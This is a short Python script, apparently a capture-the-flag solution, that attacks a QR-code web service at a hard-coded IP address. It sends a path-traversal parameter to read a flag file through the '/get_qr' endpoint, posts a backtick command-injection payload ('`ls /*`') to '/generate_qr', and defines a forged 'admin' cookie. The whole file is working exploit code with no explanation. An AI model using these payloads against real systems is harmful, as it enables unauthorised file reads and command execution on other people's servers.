import requests
from pyzbar.pyzbar import decode
from PIL import Image

def read_file():
    cookies = {
        'admin': 'true',
    }
    params = {
        'uname': '../../../../../../../../../../h3r3_15_90ur_f149'
    }

    response = requests.get('http://51.250.81.57:40006/get_qr', params=params)

    data = response.content
    print(data)
    # with open('tmp.png', 'wb') as f:
    #     f.write(data)

    # qr = Image.open('tmp.png')
    # print(decode(qr)[0].data)


def exec_cmd():
    cookies = {
        'admin': 'true',
    }
    json = [
        '`ls /*`'
    ]

    response = requests.post('http://51.250.81.57:40006/generate_qr', json=json)

    print(response.content)


exec_cmd()
read_file()